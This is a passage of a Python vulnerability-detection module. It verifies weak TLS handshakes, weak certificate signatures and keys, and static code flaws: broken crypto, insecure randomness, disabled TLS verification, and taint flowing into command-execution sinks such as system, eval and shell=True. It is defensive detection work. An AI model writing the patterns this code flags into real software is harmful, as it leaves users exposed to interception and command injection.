        evidence=(f"unauthenticated GET reached {url or 'the resource'} — HTTP {status} with a "
                  f"{body_len}-byte body (content-type {content_type or 'unknown'})"),
        observed={"url": url, "status": status, "body_len": body_len,
                  "content_type": content_type[:96], "authenticated": False})


# ---------------------------------------------------------------------------
# TLS weakness — a real handshake negotiated a deprecated protocol / weak cipher
# ---------------------------------------------------------------------------

# Protocols no client should still negotiate (uppercased ``ssl.SSLSocket.version()`` strings).
_DEPRECATED_TLS_VERSIONS = frozenset({"SSLV2", "SSLV3", "TLSV1", "TLSV1.1"})

# Broken cipher-suite tokens (uppercased). Each names a construction with a known, practical weakness
# (a keystream / key-size / hash / authentication break), so a suite carrying it is weak whatever the
# protocol version.
_WEAK_CIPHER_TOKENS: tuple[tuple[str, str], ...] = (
    ("RC4", "RC4 keystream biases"),
    ("RC2", "RC2 is broken"),
    ("3DES", "3DES/Sweet32 (64-bit block)"),
    ("DES-CBC3", "3DES/Sweet32 (64-bit block)"),
    ("DES-CBC", "single-DES 56-bit key"),
    ("EXPORT", "export-grade (deliberately weakened) crypto"),
    ("EXP-", "export-grade (deliberately weakened) crypto"),
    ("NULL", "NULL cipher — no encryption"),
    ("ADH", "anonymous DH — no authentication"),
    ("AECDH", "anonymous ECDH — no authentication"),
    ("ANON", "anonymous key exchange — no authentication"),
    ("MD5", "MD5 MAC is broken"),
    ("IDEA", "IDEA is deprecated"),
    ("SEED", "SEED is deprecated"),
)


def tls_weakness_oracle(observed_tls: Any) -> OracleSignal:
    """Fire when a REAL TLS handshake negotiated a DEPRECATED protocol or a WEAK cipher suite — the
    server actually agreed to it, so it is a re-verifiable FACT about the endpoint's crypto posture,
    not a config guess. Judges the retained handshake (``verify.tls.capture_tls_handshake`` captured it
    over a live connection); a strong TLS1.2/1.3 handshake with a modern suite does NOT fire (good
    posture is not a finding), and an absent/failed handshake does not fire.

    ``observed_tls`` is JSON-safe evidence::

        {"connected": bool, "host": str, "port": int, "tls_version": "TLSv1"|"TLSv1.2"|...,
         "cipher": "ECDHE-RSA-AES128-GCM-SHA256"|..., "cipher_bits": int?, "error": str?}

    A deprecated protocol confirms at 0.95; a weak cipher at 0.92. Pure and deterministic, so the same
    verdict re-verifies offline from the retained context — an absent signal is never an assumed pass."""
    if not isinstance(observed_tls, Mapping):
        return OracleSignal(kind=OracleKind.TLS_WEAKNESS, fired=False, confidence=0.0,
                            evidence="no tls handshake evidence")
    tls = observed_tls
    if tls.get("connected") is not True:
        return OracleSignal(
            kind=OracleKind.TLS_WEAKNESS, fired=False, confidence=0.0,
            evidence=f"no completed tls handshake: {_coerce_text(tls.get('error')).strip() or 'not connected'}")
    host = _coerce_text(tls.get("host")).strip()
    version_raw = _coerce_text(tls.get("tls_version")).strip()
    cipher_raw = _coerce_text(tls.get("cipher")).strip()
    version_u = version_raw.upper()
    cipher_u = cipher_raw.upper()

    if version_u in _DEPRECATED_TLS_VERSIONS:
        return OracleSignal(
            kind=OracleKind.TLS_WEAKNESS, fired=True, confidence=0.95,
            evidence=f"{host or 'endpoint'} negotiated deprecated protocol {version_raw}",
            observed={"host": host, "tls_version": version_raw, "cipher": cipher_raw,
                      "reason": "deprecated_protocol"})
    for token, why in _WEAK_CIPHER_TOKENS:
        if token in cipher_u:
            return OracleSignal(
                kind=OracleKind.TLS_WEAKNESS, fired=True, confidence=0.92,
                evidence=f"{host or 'endpoint'} negotiated weak cipher {cipher_raw or '?'} — {why}",
                observed={"host": host, "tls_version": version_raw, "cipher": cipher_raw,
                          "reason": "weak_cipher", "token": token})
    return OracleSignal(
        kind=OracleKind.TLS_WEAKNESS, fired=False, confidence=0.0,
        evidence=f"no TLS weakness: negotiated {version_raw or '?'} / {cipher_raw or '?'}",
        observed={"host": host, "tls_version": version_raw, "cipher": cipher_raw})


# ---------------------------------------------------------------------------
# Weak crypto artifact — a parsed cert signed with a BROKEN hash (MD5/SHA1)
# ---------------------------------------------------------------------------

# Broken signature hashes (collision-forgeable): MD2/MD4/MD5 and SHA-1. `sha1` must NOT match
# sha224/256/384/512 — the negative lookahead ``(?![0-9])`` guards it (SHA-1 is never a prefix of a
# stronger SHA-2 name). Applied ONLY to a controlled signatureAlgorithm OID name, case-insensitive.
_WEAK_SIG_HASH_RE = re.compile(r"(?i)(?:md[245]|sha-?1(?![0-9]))")
# Fallback when the signatureAlgorithm resolved only to a dotted OID: the known broken-hash sig OIDs.
_WEAK_SIG_OIDS = frozenset({
    "1.2.840.113549.1.1.2",   # md2WithRSAEncryption
    "1.2.840.113549.1.1.3",   # md4WithRSAEncryption
    "1.2.840.113549.1.1.4",   # md5WithRSAEncryption
    "1.2.840.113549.1.1.5",   # sha1WithRSAEncryption
    "1.2.840.10040.4.3",      # dsa-with-sha1
    "1.2.840.10045.4.1",      # ecdsa-with-SHA1
    "1.3.14.3.2.29",          # sha1WithRSASignature (legacy)
    "1.3.14.3.2.27",          # dsaWithSHA1 (legacy)
})
# Public-key size floors below which a certificate key provides less than the ~112-bit security NIST has
# required since 2013 (SP 800-131A). Conservative + unambiguous: RSA/DSA < 2048 bits (1024-bit RSA is a
# ~80-bit-security deprecated key; 512-bit is factorable today), EC curve < 224 bits (P-192 and below).
# A 2048-bit RSA / P-256 EC / Ed25519 key is fine and never fires. Ed25519/Ed448 have no classical size.
_MIN_RSA_DSA_BITS = 2048
_MIN_EC_BITS = 224


def weak_crypto_artifact_oracle(observed: Any) -> OracleSignal:
    """Fire when a parsed crypto artifact (an X.509 cert) is signed with a BROKEN hash — MD5/MD4/MD2 or
    SHA-1. These are collision-forgeable (MD5 chosen-prefix, SHA-1 SHAttered) with NO benign use for a
    certificate signature, so a benign modern cert (SHA-256+) does NOT fire. The proof is the retained
    signatureAlgorithm OID NAME (or dotted OID) — a pure, deterministic classification that re-verifies
    offline, exactly like ``tls_weakness_oracle`` re-verifies a negotiated cipher name. Emitted under the
    TLS_WEAKNESS kind (a weak-crypto FACT). Never raises."""
    if not isinstance(observed, Mapping):
        return OracleSignal(kind=OracleKind.TLS_WEAKNESS, fired=False, confidence=0.0,
                            evidence="no crypto-artifact evidence")
    name = _coerce_text(observed.get("signature_algorithm")).strip()
    oid = _coerce_text(observed.get("oid")).strip()
    subject = _coerce_text(observed.get("subject")).strip()
    subj = (" " + subject) if subject else ""
    # (1) BROKEN SIGNATURE HASH — collision-forgeable, no benign use.
    if (name and _WEAK_SIG_HASH_RE.search(name)) or (oid in _WEAK_SIG_OIDS):
        return OracleSignal(
            kind=OracleKind.TLS_WEAKNESS, fired=True, confidence=0.95,
            evidence=(f"certificate{subj} is signed with the BROKEN hash {name or oid} — collision-forgeable "
                      "(MD5 chosen-prefix / SHA-1 SHAttered), no benign use"),
            observed={"signature_algorithm": name, "oid": oid, "subject": subject, "reason": "broken_sig_hash"})
    # (2) UNDERSIZED PUBLIC KEY — below the ~112-bit-security floor (NIST SP 800-131A, deprecated 2013).
    key_type = _coerce_text(observed.get("key_type")).strip().lower()
    try:
        key_bits = int(observed.get("key_bits"))
    except (TypeError, ValueError):
        key_bits = 0
    if key_bits > 0 and (
            (key_type in ("rsa", "dsa") and key_bits < _MIN_RSA_DSA_BITS)
            or (key_type == "ec" and key_bits < _MIN_EC_BITS)):
        floor = _MIN_RSA_DSA_BITS if key_type in ("rsa", "dsa") else _MIN_EC_BITS
        return OracleSignal(
            kind=OracleKind.TLS_WEAKNESS, fired=True, confidence=0.9,
            evidence=(f"certificate{subj} uses an UNDERSIZED {key_type.upper()} public key ({key_bits}-bit, "
                      f"below the {floor}-bit floor) — under ~112-bit security (NIST SP 800-131A, deprecated 2013)"),
            observed={"key_type": key_type, "key_bits": key_bits, "subject": subject, "reason": "short_key"})
    return OracleSignal(
        kind=OracleKind.TLS_WEAKNESS, fired=False, confidence=0.0,
        evidence=f"signature algorithm {name or oid or '?'} is not a broken hash and the key is not undersized")


# ---------------------------------------------------------------------------
# Static source-code rule — a re-runnable deterministic rule over RETAINED SOURCE-CODE BYTES.
#
# The SAST bridge: the analysis path emits LEADs; this oracle promotes ONE to a "static FACT" by RE-PARSING
# the retained source region ITSELF (Python `ast`) and re-deriving a CODE PROPERTY — never trusting
# semgrep/joern or the tool's CWE. It is the source-code sibling of weak_crypto_artifact_oracle (which
# re-derives MD5/SHA1 from a retained artifact). Each FACT is honestly scoped to a PROVEN code property,
# NEVER "exploitable at runtime". The rule_id vocabulary is CLOSED; a non-Python or unparseable region
# REFUSES (never mints); a tamper that removes the property no longer re-fires (rejected at re-verify).
# ---------------------------------------------------------------------------

# The CLOSED rule-id vocabulary — the four SOUND tiers. An unknown rule_id NEVER fires (a lead at most).
_STATIC_RULE_IDS = frozenset({
    "broken-crypto-invocation",   # (a) a broken/risky primitive is CONSTRUCTED or CALLED here
    "insecure-randomness-sink",   # (b) a non-crypto PRNG value flows DIRECTLY into a security sink (same fn)
    "insecure-flag-literal",      # (c) a security flag is EXPLICITLY disabled as a LITERAL
    "direct-taint",               # (d) source -> sink in ONE function, no sanitizer between ("Firm" tier)
})

# (a) BROKEN / risky primitives. Hash: md5/sha1/md4/md2 (collision-forgeable). Cipher: DES/3DES/RC4/Blowfish/
# IDEA (broken or SWEET32-risky). ECB block mode (deterministic — a broken usage). Case-insensitive by lower().
_BROKEN_HASH_NAMES = frozenset({"md5", "sha1", "md4", "md2"})
_BROKEN_CIPHER_NAMES = frozenset({"des", "des3", "tripledes", "arc4", "rc4", "blowfish", "idea"})
# PROVENANCE floor for tier (a): a primitive is only "broken crypto in use" when its name RESOLVES (via an
# import in the retained region) to one of these cryptographic packages. A bare/unimported name that merely
# LOOKS like md5() has no crypto provenance and is a LEAD (the veracity firewall re-derives the property, it
# does not re-run the tool's name pattern). `hmac` is included so a PRNG value flowing into `hmac.new(...)`
# is recognised as a crypto sink in tier (b); it carries no broken-primitive name, so tier (a) is unaffected.
_CRYPTO_MODULE_ROOTS = frozenset({"hashlib", "hmac", "crypto", "cryptodome", "cryptography"})


def _attr_or_name(node: Any) -> str:
    """The short callee identifier of a Call target: an ``ast.Name`` id or an ``ast.Attribute`` attr; else ''."""
    if isinstance(node, ast.Name):
        return node.id
    if isinstance(node, ast.Attribute):
        return node.attr
    return ""


def _dotted_parts(node: Any) -> "list[str]":
    """The dotted identifier chain of a pure Name/Attribute expression, root-first: ``hashlib.md5`` ->
    ['hashlib', 'md5']; ``Crypto.Cipher.DES.new`` -> ['Crypto', 'Cipher', 'DES', 'new']; a bare ``md5`` ->
    ['md5']. Returns [] when the base is not a plain Name (a subscript / call / literal in the chain — an
    UNRESOLVABLE base, so a LEAD)."""
    parts: list[str] = []
    cur = node
    while isinstance(cur, ast.Attribute):
        parts.append(cur.attr)
        cur = cur.value
    if not isinstance(cur, ast.Name):
        return []
    parts.append(cur.id)
    parts.reverse()
    return parts


def _is_crypto_module(dotted: str) -> bool:
    """True iff a dotted module path's ROOT segment is a cryptographic package (the provenance test)."""
    return bool(dotted) and dotted.split(".")[0].strip().lower() in _CRYPTO_MODULE_ROOTS


def _collect_crypto_imports(tree: ast.AST) -> "tuple[set[str], dict[str, tuple[str, str]]]":
    """RESOLVE PROVENANCE for tier (a). Returns ``(crypto_module_locals, from_crypto)``:
      * ``crypto_module_locals`` — local names bound to a CRYPTO MODULE (``import hashlib`` /
        ``import hashlib as h`` / ``import Crypto.Cipher.DES`` binds the root ``Crypto``).
      * ``from_crypto`` — ``local -> (module, original)`` for ``from <crypto-module> import X [as local]``.
    Only crypto-namespace imports are recorded; a name with no crypto provenance is never resolvable to a
    broken primitive (a LEAD)."""
    crypto_locals: set[str] = set()
    from_crypto: dict[str, tuple[str, str]] = {}
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                mod = alias.name or ""
                if _is_crypto_module(mod):
                    crypto_locals.add(alias.asname or mod.split(".")[0])
        elif isinstance(node, ast.ImportFrom):
            mod = node.module or ""
            if not mod or not _is_crypto_module(mod):
                continue   # a bare relative import / non-crypto module — unresolved provenance (LEAD).
            for alias in node.names:
                if alias.name != "*":
                    from_crypto[alias.asname or alias.name] = (mod, alias.name)
    return crypto_locals, from_crypto


def _collect_local_shadows(tree: ast.AST) -> "set[str]":
    """Names DEFINED locally in the retained region (``def`` / ``async def`` / ``class`` / a simple
    assignment target). A call to such a name is the LOCAL definition, not an imported primitive, so it is
    never minted (e.g. a locally-shadowed ``def md5(): ...``)."""
    shadows: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
            shadows.add(node.name)
        elif isinstance(node, (ast.Assign, ast.AnnAssign)):
            shadows.update(_assign_targets(node))
    return shadows


def _base_is_crypto(name: str, crypto_locals: "set[str]", from_crypto: "dict[str, tuple[str, str]]",
                    shadows: "set[str]") -> bool:
    """A base identifier resolves to a crypto module (import provenance) and is not locally shadowed."""
    if name in shadows and name not in crypto_locals and name not in from_crypto:
        return False
    return name in crypto_locals or name in from_crypto


def _broken_crypto_call_detail(node: ast.Call, crypto_locals: "set[str]",
                               from_crypto: "dict[str, tuple[str, str]]",
                               shadows: "set[str]") -> "str | None":
    """A Call RESOLVES to a genuinely-invoked broken primitive (returns a detail) or does not (``None`` ->
    a LEAD). A bare/unimported name and a locally-shadowed def never mint; the provenance MUST resolve to a
    crypto module."""
    parts = _dotted_parts(node.func)
    if not parts:
        return None
    root = parts[0]
    if len(parts) == 1:
        # BARE name call: md5(...) — mints ONLY as a from-import of a broken primitive, never unimported.
        if root in shadows:
            return None
        if root in from_crypto:
            orig = from_crypto[root][1].lower()
            if orig in _BROKEN_HASH_NAMES:
                return f"{orig.upper()} (broken hash) imported from {from_crypto[root][0]} and invoked"
            if orig in _BROKEN_CIPHER_NAMES or orig.replace("_", "") in _BROKEN_CIPHER_NAMES:
                return f"{orig.upper()} (broken cipher) imported from {from_crypto[root][0]} and invoked"
        return None   # bare unimported name — provenance unresolved (LEAD).
    # ATTRIBUTE call: hashlib.md5(...) / DES.new(...) / algorithms.TripleDES(...) / hashlib.new("md5").
    if not _base_is_crypto(root, crypto_locals, from_crypto, shadows):
        return None   # base is a local binding or has no crypto provenance (LEAD).
    if root in crypto_locals:
        segs = [p.lower() for p in parts[1:]]
    else:
        segs = [from_crypto[root][1].lower()] + [p.lower() for p in parts[1:]]
    # <crypto-module>.new("md5") — a `.new` with a broken-hash NAME constant.
    if parts[-1] == "new" and node.args and isinstance(node.args[0], ast.Constant) \
            and isinstance(node.args[0].value, str) \
            and node.args[0].value.strip().lower().replace("-", "") in _BROKEN_HASH_NAMES:
        return f"{node.args[0].value.strip().upper()} (broken hash) via .new({node.args[0].value!r})"
    for seg in segs:
        if seg in _BROKEN_HASH_NAMES:
            return f"{seg.upper()} (broken hash) invoked from a resolved crypto module"
        if seg in _BROKEN_CIPHER_NAMES or seg.replace("_", "") in _BROKEN_CIPHER_NAMES:
            return f"{seg.upper()} (broken/risky cipher) invoked from a resolved crypto module"
    return None


def _ecb_construction_detail(tree: ast.AST, crypto_locals: "set[str]",
                             from_crypto: "dict[str, tuple[str, str]]",
                             shadows: "set[str]") -> "str | None":
    """ECB is a WEAK MODE, not a primitive: mint ONLY when it is CONSTRUCTED into a cipher (passed as an
    argument to a ``.new(...)`` / ``Cipher(...)`` call), NEVER when it is merely COMPARED against — a
    defensive ``if mode == AES.MODE_ECB: raise`` is a REJECTION of ECB, not a use of it."""
    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        callee = node.func
        # (1) pycryptodome: <Cipher>.new(key, <X>.MODE_ECB) — MODE_ECB passed as an argument to a `.new`.
        if _attr_or_name(callee) == "new" and isinstance(callee, ast.Attribute) \
                and _base_is_crypto(_attr_or_name(callee.value), crypto_locals, from_crypto, shadows):
            for arg in node.args:
                for sub in ast.walk(arg):
                    if isinstance(sub, ast.Attribute) and sub.attr == "MODE_ECB":
                        return (f"ECB block mode (MODE_ECB) constructed into a cipher via "
                                f"`{_attr_or_name(callee.value)}.new(...)` — deterministic, a broken usage")
        # (2) cryptography: Cipher(algorithms.AES(key), modes.ECB()) — modes.ECB() constructed as an arg.
        for arg in list(node.args) + [kw.value for kw in node.keywords]:
            for sub in ast.walk(arg):
                if isinstance(sub, ast.Call) and isinstance(sub.func, ast.Attribute) \
                        and sub.func.attr == "ECB" \
                        and _attr_or_name(sub.func.value).lower() == "modes" \
                        and _base_is_crypto(_attr_or_name(sub.func.value), crypto_locals, from_crypto, shadows):
                    return "ECB block mode (modes.ECB) constructed into a Cipher(...) — deterministic, a broken usage"
    return None


def _broken_crypto_hit(tree: ast.AST) -> "tuple[bool, str]":
    """RE-DERIVE tier (a): a broken/risky crypto primitive is GENUINELY INVOKED/CONSTRUCTED here, with its
    provenance RESOLVED to a real crypto module. Pure AST — no execution, no import. A bare/unimported name,
    a locally-shadowed def, or a mere reference / comparison / defensive guard does NOT mint (a LEAD —
    soundness over recall). Returns (fired, detail)."""
    crypto_locals, from_crypto = _collect_crypto_imports(tree)
    shadows = _collect_local_shadows(tree)
    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            detail = _broken_crypto_call_detail(node, crypto_locals, from_crypto, shadows)
            if detail:
                return True, detail
    ecb = _ecb_construction_detail(tree, crypto_locals, from_crypto, shadows)
    if ecb:
        return True, ecb
    return False, ""


# (b) NON-cryptographic PRNG functions — predictable, unfit for a secret/token (CWE-330/CWE-338).
_INSECURE_RANDOM_FNS = frozenset({
    "random", "randint", "randrange", "choice", "choices", "uniform", "getrandbits",
    "sample", "shuffle", "randbytes", "betavariate", "gauss", "normalvariate",
})
# A GENUINE SECURITY SINK for tier (b): the PRNG value must FLOW INTO one of these — a security-material
# keyword PARAMETER, a security-material generator/consumer CALLEE, or a resolved crypto call. A merely
# security-ISH assignment-TARGET NAME (`token = random.choice(...)`) is NOT a sink — that was the false-
# positive class, and it stays a LEAD. Names are matched non-alnum-stripped + lower (`set_password` ->
# `setpassword`, `iv=` -> `iv`), so spelling variants collapse to one key.
_SECURITY_SINK_PARAMS = frozenset({
    "key", "secret", "token", "password", "passwd", "pwd", "iv", "salt", "nonce",
    "privatekey", "signingkey", "secretkey", "apikey", "authkey", "sessionkey", "csrftoken", "otp",
})
_SECURITY_SINK_CALLEES = frozenset({
    "setpassword", "checkpassword", "makepassword", "hashpassword", "generatepassword", "genpassword",
    "generatetoken", "createtoken", "maketoken", "gentoken", "newtoken", "issuetoken",
    "generatesecret", "makesecret", "gensecret", "createsecret",
    "generatekey", "derivekey", "genkey", "makekey", "createkey", "newkey",
    "generateapikey", "createapikey", "makeapikey",
    "generateotp", "makeotp", "genotp", "generatenonce", "makenonce",
    "generatesalt", "makesalt", "generateiv", "makeiv",
    "sign", "hmac", "encrypt", "seal", "pbkdf2hmac",
})


def _is_insecure_random_call(node: Any) -> bool:
    """True iff ``node`` is a call to a NON-crypto PRNG (random.random/randint/… or a bare randint(...)).
    ``random.SystemRandom`` / ``secrets`` / ``os.urandom`` are cryptographic and never match."""
    if not isinstance(node, ast.Call):
        return False
    callee = node.func
    short = _attr_or_name(callee)
    if short not in _INSECURE_RANDOM_FNS:
        return False
    # Reject the cryptographic SystemRandom(...).random() path: base object named SystemRandom/secrets.
    if isinstance(callee, ast.Attribute):
        base = _attr_or_name(callee.value).lower()
        if base in ("systemrandom", "secrets", "secretsgenerator"):
            return False
    return True


def _expr_uses_prng(expr: Any, rand_vars: "set[str]") -> bool:
    """True iff ``expr`` contains a non-crypto PRNG call directly, or references a single-hop alias bound to
    one earlier in the same function (``r = random.random(); ... f(r)``)."""
    if _subtree_has(_is_insecure_random_call, expr):
        return True
    for n in ast.walk(expr) if isinstance(expr, ast.AST) else []:
        if isinstance(n, ast.Name) and n.id in rand_vars:
            return True
    return False


def _subtree_has(pred: Any, node: Any) -> bool:
    return any(pred(n) for n in ast.walk(node)) if isinstance(node, ast.AST) else False


def _assign_targets(node: Any) -> "list[str]":
    """The simple target NAMES of an Assign / AnnAssign (Name or Attribute leaf), for sink-name matching."""
    names: list[str] = []
    targets = list(getattr(node, "targets", [])) or ([node.target] if getattr(node, "target", None) else [])
    for t in targets:
        for n in ast.walk(t):
            if isinstance(n, ast.Name):
                names.append(n.id)
            elif isinstance(n, ast.Attribute):
                names.append(n.attr)
    return names


def _insecure_randomness_hit(tree: ast.AST) -> "tuple[bool, str]":
    """RE-DERIVE tier (b): a non-crypto PRNG value FLOWS INTO A GENUINE SECURITY SINK within the SAME
    function — passed (directly, or via a single-hop alias) as an argument to a security-material keyword
    PARAMETER, a security generator/consumer CALLEE, or a resolved crypto call. A PRNG merely ASSIGNED to a
    security-ISH variable NAME is NOT a sink (that was the FP class) and stays a LEAD. Pure AST; no
    execution; inter-procedural / whole-program flows are not re-derived here."""
    crypto_locals, from_crypto = _collect_crypto_imports(tree)
    shadows = _collect_local_shadows(tree)
    for fn in ast.walk(tree):
        if not isinstance(fn, (ast.FunctionDef, ast.AsyncFunctionDef)):
            continue
        # names bound directly to a non-crypto PRNG call in this function (single-hop alias source).
        rand_vars: set[str] = set()
        for node in ast.walk(fn):
            if isinstance(node, (ast.Assign, ast.AnnAssign)) and node.value is not None \
                    and _subtree_has(_is_insecure_random_call, node.value):
                rand_vars.update(_assign_targets(node))
        for node in ast.walk(fn):
            if not isinstance(node, ast.Call):
                continue
            callee_short = _attr_or_name(node.func)
            # (A) a PRNG passed to a security-material KEYWORD parameter of ANY call — used AS a secret.
            for kw in node.keywords:
                if kw.arg and re.sub(r"[^a-z0-9]", "", kw.arg.lower()) in _SECURITY_SINK_PARAMS \
                        and _expr_uses_prng(kw.value, rand_vars):
                    return True, (f"a non-cryptographic PRNG feeds the security parameter `{kw.arg}=` of "
                                  f"`{callee_short}(...)` in function `{fn.name}`")
            # (B) a PRNG flowing into a security generator/consumer CALLEE or a resolved crypto call.
            parts = _dotted_parts(node.func)
            crypto_call = bool(parts) and _base_is_crypto(parts[0], crypto_locals, from_crypto, shadows)
            callee_key = re.sub(r"[^a-z0-9]", "", callee_short.lower())
            if callee_key in _SECURITY_SINK_CALLEES or crypto_call:
                args = list(node.args) + [kw.value for kw in node.keywords]
                if any(_expr_uses_prng(a, rand_vars) for a in args):
                    return True, (f"a non-cryptographic PRNG flows into the security-sensitive call "
                                  f"`{callee_short}(...)` in function `{fn.name}`")
    return False, ""


# (c) Security flags whose EXPLICIT insecure LITERAL is a proven weakness. An ABSENT flag is default-dependent
# and is NOT a member here (REFUSE — a lead). Each maps to the literal value that disables the protection.
_INSECURE_FLAG_FALSE = frozenset({"verify", "secure", "check_hostname", "verify_mode", "validate_certs"})
# The insecure flag only mints when it is bound to a RESOLVED security-relevant callee — an HTTP request /
# session on one of these libraries, or a TLS context / wrap. A callee that merely HAPPENS to accept a
# `verify=` / `secure=` kwarg (`chart.render(verify=False)`, `widget.build(secure=False)`) does NOT resolve
# to a security API and stays a LEAD.
_HTTP_TLS_MODULE_ROOTS = frozenset({"requests", "httpx", "urllib", "urllib3", "aiohttp", "ssl"})
# HTTP session/client CONSTRUCTORS — a var bound to one carries the insecure flag on its request methods.
_HTTP_SESSION_CTORS = frozenset({"session", "client", "clientsession", "asyncclient"})
# Security-relevant METHODS/callables on a RESOLVED HTTP/TLS base (requests, TLS wraps, a cookie set).
_SECURITY_RELEVANT_METHODS = frozenset({
    "get", "post", "put", "delete", "patch", "head", "options", "request", "send",
    "session", "client", "clientsession", "asyncclient",
    "wrapsocket", "createdefaultcontext", "sslcontext", "wrapbio", "setcookie", "createconnection",
})


def _collect_http_tls(tree: ast.AST) -> "tuple[set[str], dict[str, tuple[str, str]], set[str]]":
    """RESOLVE PROVENANCE for tier (c). Returns ``(http_locals, from_http, session_vars)``: names bound to an
    HTTP/TLS MODULE, ``from``-imported HTTP/TLS symbols, and variables bound to a RESOLVED HTTP session/client
    constructor (``s = requests.Session()``)."""
    http_locals: set[str] = set()
    from_http: dict[str, tuple[str, str]] = {}
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                mod = alias.name or ""
                if mod.split(".")[0].strip().lower() in _HTTP_TLS_MODULE_ROOTS:
                    http_locals.add(alias.asname or mod.split(".")[0])
        elif isinstance(node, ast.ImportFrom):
            mod = node.module or ""
            if mod and mod.split(".")[0].strip().lower() in _HTTP_TLS_MODULE_ROOTS:
                for alias in node.names:
                    if alias.name != "*":
                        from_http[alias.asname or alias.name] = (mod, alias.name)
    session_vars: set[str] = set()
    for node in ast.walk(tree):
        if not isinstance(node, (ast.Assign, ast.AnnAssign)) or not isinstance(node.value, ast.Call):
            continue
        ctor = re.sub(r"[^a-z0-9]", "", _attr_or_name(node.value.func).lower())
        if ctor not in _HTTP_SESSION_CTORS:
            continue
        parts = _dotted_parts(node.value.func)
        base_ok = len(parts) >= 2 and parts[0] in http_locals          # requests.Session()
        imported_ctor = len(parts) == 1 and parts[0] in from_http      # from requests import Session; Session()
        if base_ok or imported_ctor:
            session_vars.update(_assign_targets(node))
    return http_locals, from_http, session_vars


def _is_security_relevant_callee(callee: Any, http_locals: "set[str]",
                                 from_http: "dict[str, tuple[str, str]]", session_vars: "set[str]") -> bool:
    """True iff ``callee`` RESOLVES to a security-relevant HTTP/TLS API — a request on a resolved HTTP module
    or session, a TLS context / wrap, or a cookie set — NOT any callee that merely happens to accept a
    ``verify=`` / ``secure=`` kwarg (``chart.render`` / ``widget.build`` do not resolve => LEAD)."""
    if isinstance(callee, ast.Attribute):
        method = re.sub(r"[^a-z0-9]", "", callee.attr.lower())
        if _attr_or_name(callee.value) in session_vars:
            return True
        parts = _dotted_parts(callee.value)
        base_is_http = bool(parts) and (parts[0] in http_locals or parts[0] in from_http)
        return base_is_http and method in _SECURITY_RELEVANT_METHODS
    if isinstance(callee, ast.Name):
        return callee.id in from_http and re.sub(r"[^a-z0-9]", "", callee.id.lower()) in _SECURITY_RELEVANT_METHODS
    return False


def _insecure_flag_hit(tree: ast.AST) -> "tuple[bool, str]":
    """RE-DERIVE tier (c): a KNOWN security flag is EXPLICITLY set to its insecure LITERAL AND passed to a
    RESOLVED security-relevant HTTP/TLS callee — ``requests.get(..., verify=False)`` / ``s.post(...,
    verify=False)`` / ``ssl.wrap_socket(..., cert_reqs=ssl.CERT_NONE)``. An ABSENT flag, or an insecure flag
    on an UNRESOLVED / non-security callee (``chart.render(verify=False)``), never mints (a LEAD)."""
    http_locals, from_http, session_vars = _collect_http_tls(tree)
    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        hit = ""
        for kw in node.keywords:
            if kw.arg is None:
                continue
            if kw.arg in _INSECURE_FLAG_FALSE and isinstance(kw.value, ast.Constant) and kw.value.value is False:
                hit = f"the security flag `{kw.arg}=False`"
                break
            # cert_reqs / verify_mode = ssl.CERT_NONE (TLS certificate verification explicitly disabled).
            if kw.arg in ("cert_reqs", "verify_mode") and isinstance(kw.value, ast.Attribute) \
                    and kw.value.attr == "CERT_NONE":
                hit = f"the TLS flag `{kw.arg}=ssl.CERT_NONE`"
                break
        if hit and _is_security_relevant_callee(node.func, http_locals, from_http, session_vars):
            return True, f"{hit} is explicitly disabled on a resolved security-relevant HTTP/TLS API"
    return False, ""


# (d) DIRECT intra-procedural taint. Sources / sinks / sanitizers — a conservative, near-zero-FP set. A
# sanitizer anywhere in the function REFUSES (fail-closed to a lead).
_TAINT_SOURCE_ATTRS = frozenset({"args", "form", "values", "cookies", "params", "query", "GET", "POST"})
_TAINT_SOURCE_FNS = frozenset({"input", "getenv", "get_json"})
_TAINT_SINK_FNS = frozenset({"system", "popen", "eval", "exec", "call", "run", "Popen", "check_output", "execute"})
_SANITIZER_FNS = frozenset({
    "quote", "escape", "clean", "int", "float", "bool", "isdigit", "isalnum", "isnumeric",
    "sanitize", "validate", "shlex", "sub", "match", "fullmatch", "abspath", "basename",
})


def _is_taint_source(node: Any) -> bool:
    """True iff ``node`` is a recognised taint SOURCE expression: ``request.args...`` / ``request.form[...]`` /
    ``input(...)`` / ``os.environ[...]`` / ``os.getenv(...)`` / ``sys.argv[...]``."""
    # request.<args|form|values|...>...  or  ...GET.get(...)
    for sub in ast.walk(node) if isinstance(node, ast.AST) else []:
        if isinstance(sub, ast.Attribute):
            if sub.attr in _TAINT_SOURCE_ATTRS and isinstance(sub.value, (ast.Name, ast.Attribute)):
                base = _attr_or_name(sub.value).lower()
                if base in ("request", "req", "self", "flask", "django"):
                    return True
        if isinstance(sub, ast.Call):
            short = _attr_or_name(sub.func)
            if short in _TAINT_SOURCE_FNS:
                return True
        if isinstance(sub, ast.Attribute) and sub.attr == "argv" and _attr_or_name(sub.value).lower() == "sys":
            return True
        if isinstance(sub, ast.Attribute) and sub.attr == "environ" and _attr_or_name(sub.value).lower() == "os":
            return True
    return False


def _has_sanitizer(fn: ast.AST) -> bool:
    for node in ast.walk(fn):
        if isinstance(node, ast.Call) and _attr_or_name(node.func) in _SANITIZER_FNS:
            return True
    return False


def _shell_true(call: ast.Call) -> bool:
    return any(kw.arg == "shell" and isinstance(kw.value, ast.Constant) and kw.value.value is True
               for kw in call.keywords)


def _direct_taint_hit(tree: ast.AST) -> "tuple[bool, str]":
    """RE-DERIVE tier (d): a taint SOURCE reaches a dangerous SINK in ONE function with NO sanitizer between.
    Conservative + fail-closed: any sanitizer in the function REFUSES; subprocess sinks require shell=True to
    be command-injection-shaped. Single-hop variable aliasing is followed. Inter-procedural flows stay a lead."""
    for fn in ast.walk(tree):
        if not isinstance(fn, (ast.FunctionDef, ast.AsyncFunctionDef)):
            continue
        if _has_sanitizer(fn):
            continue   # a sanitizer is present — cannot prove the flow is unsanitized (fail-closed to a lead)
        # variables assigned DIRECTLY from a taint source in this function (single-hop alias).
        tainted: set[str] = set()
        for node in ast.walk(fn):
